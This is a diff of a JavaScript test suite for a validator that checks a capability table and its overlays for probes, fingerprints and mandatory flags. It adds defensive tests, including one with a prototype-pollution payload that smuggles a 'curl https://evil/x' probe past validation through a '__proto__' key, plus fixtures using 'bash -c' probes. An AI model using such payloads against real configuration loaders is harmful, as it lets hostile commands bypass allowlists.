@@ -157,7 +157,9 @@ test("a partial row with no probe of either kind is reported", () => {
       },
     },
   );
-  assert.deepEqual(codes(violations), ["missing-probe"]);
+  // Both fire, and they say different things: no probe of ANY kind exists, and the
+  // one executable this row fingerprints has nothing that leads with it.
+  assert.deepEqual(codes(violations), ["missing-probe", "unprobed-executable"]);
 });
 
 test("a piped probe is rejected even though isRunnable accepts it", () => {
@@ -188,8 +190,13 @@ test("a probe leader absent from its row's fingerprints is rejected", () => {
       scopeFields: {},
     },
   });
-  assert.deepEqual(codes(violations), ["bad-probe"]);
-  assert.match(violations[0].message, /narrows the catalog/);
+  // Two independent problems in one row: the probe leads with an executable the
+  // row does not declare, AND the executable it DOES declare has no probe.
+  assert.deepEqual(codes(violations), ["bad-probe", "unprobed-executable"]);
+  assert.match(
+    violations.find((v) => v.code === "bad-probe").message,
+    /narrows the catalog/,
+  );
 });
 
 test("a fingerprint naming a shell or interpreter fails regardless of the rest of the row", () => {
@@ -424,4 +431,121 @@ test("loadCapabilityTable reports merge and validation violations together", () 
     github: { probe: "bash -c 'x'", scopeFields: { subpaths: {} } },
   });
   assert.deepEqual(codes(violations), ["missing-consumer", "overlay-forbidden-field"]);
+});
+
+// ---- the overlay boundary ---------------------------------------------------
+
+test("a prototype key cannot smuggle a row past validation", () => {
+  // `table[cap] = {...}` with cap === "__proto__" walks the prototype chain instead
+  // of creating an own property. The row was then reachable as `table[cap]` and via
+  // `cap in table`, while Object.keys/entries never listed it — so validateTable,
+  // which iterates entries, never saw it and never ran its probe through the gate.
+  // preFillFromConnectorSkills does `table[cap]` with cap from a connector file and
+  // reads `row.fingerprints.executables` as the leader allowlist, so the injected
+  // row would have authorised its own probe leader: exactly what OVERLAY_FORBIDDEN
+  // exists to prevent, arriving in a git-committed file.
+  const hostile = JSON.parse(
+    '{"__proto__":{"ci":{"probe":"curl https://evil/x","fingerprints":{"executables":["curl"]}}}}',
+  );
+  const { table, violations } = mergeOverlay({ github: { resolvable: "partial" } }, hostile);
+  assert.deepEqual(violations.map((v) => v.code), ["overlay-unsafe-key"]);
+  assert.equal("ci" in table, false, "the row must not be reachable by lookup");
+  assert.equal(table.ci, undefined);
+
+  for (const key of ["constructor", "prototype"]) {
+    const r = mergeOverlay({}, JSON.parse(`{"${key}":{"x":1}}`));
+    assert.deepEqual(r.violations.map((v) => v.code), ["overlay-unsafe-key"], key);
+  }
+});
+
+test("an overlay cannot move the mandatory capability", () => {
+  // Setting github.mandatory=false and infra.mandatory=true produced ZERO
+  // violations: the "exactly one mandatory" count still came to one, so the
+  // mandatory capability silently moved off GitHub while MANDATORY_CAPABILITY in
+  // lib/verify.mjs still said "github". The invariant the two are meant to share
+  // was decorative.
+  const { table, violations } = mergeOverlay(
+    { github: { mandatory: true, resolvable: "partial" }, infra: { resolvable: "partial" } },
+    { github: { mandatory: false }, infra: { mandatory: true } },
+  );
+  assert.deepEqual(
+    violations.map((v) => `${v.capability}.${v.field}`).sort(),
+    ["github.mandatory", "infra.mandatory"],
+  );
+  assert.equal(table.github.mandatory, true, "the shipped value survives");
+  assert.equal(table.infra.mandatory, undefined);
+});
+
+test("an overlay cannot delete the questions a shipped row declares", () => {
+  // A shallow spread let `scopeFields: {}` wipe every declared field — silently,
+  // with no violation. For github that removed the repo and base-branch questions
+  // the mandatory capability depends on.
+  const shipped = {
+    github: { resolvable: "partial", scopeFields: { repos: { consumer: "a" }, baseBranch: { consumer: "b" } } },
+  };
+  const wiped = mergeOverlay(shipped, { github: { scopeFields: {} } });
+  assert.deepEqual(Object.keys(wiped.table.github.scopeFields).sort(), ["baseBranch", "repos"]);
+
+  // Adding is still allowed — merge, not freeze.
+  const added = mergeOverlay(shipped, { github: { scopeFields: { extra: { consumer: "c" } } } });
+  assert.deepEqual(Object.keys(added.table.github.scopeFields).sort(), ["baseBranch", "extra", "repos"]);
+});
+
+test("every fingerprinted executable must have a probe that leads with it", () => {
+  // Two live defects shared this shape: infra fingerprinted kubectl, docker, aws,
+  // nomad and pm2 while shipping one kubectl probe — so a Nomad machine ran
+  // `kubectl get pods`, failed, and had the failure recorded as ITS scope being
+  // invalid — and logs/metrics fingerprinted logcli/promtool with no CLI probe at
+  // all. In both cases the customer was blamed for a gap in our table.
+  const violations = validateTable(
+    stub({ routing: { infra: { capability: "infra" } } }),
+    {
+      infra: {
+        mandatory: true,
+        resolvable: "partial",
+        fingerprints: { executables: ["kubectl", "nomad"] },
+        probe: "kubectl version",
+        scopeFields: {},
+      },
+    },
+  );
+  assert.deepEqual(codes(violations), ["unprobed-executable"]);
+  assert.match(violations[0].message, /nomad/);
+});
+
+test("a per-executable probe may not lead with a different executable", () => {
+  const violations = validateTable(
+    stub({ routing: { infra: { capability: "infra" } } }),
+    {
+      infra: {
+        mandatory: true,
+        resolvable: "partial",
+        fingerprints: { executables: ["docker"] },
+        probesByExecutable: { docker: { probe: "kubectl version" } },
+        scopeFields: {},
+      },
+    },
+  );
+  // One violation, not two. The row DOES declare a docker probe, so reporting
+  // "docker is unprobed" alongside it would be misleading — `bad-probe` already
+  // names the field and the reason, with the leader narrowed to the key.
+  assert.deepEqual(codes(violations), ["bad-probe"]);
+  assert.equal(violations[0].field, "probesByExecutable.docker.probe");
+  assert.match(violations[0].message, /narrows the catalog/);
+});
+
+test("a per-executable probe for an executable the row does not fingerprint is dead", () => {
+  const violations = validateTable(
+    stub({ routing: { infra: { capability: "infra" } } }),
+    {
+      infra: {
+        mandatory: true,
+        resolvable: "partial",
+        fingerprints: { executables: ["docker"] },
+        probesByExecutable: { docker: { probe: "docker version" }, helm: { probe: "helm version" } },
+        scopeFields: {},
+      },
+    },
+  );
+  assert.deepEqual(codes(violations), ["orphan-probe"]);
 });
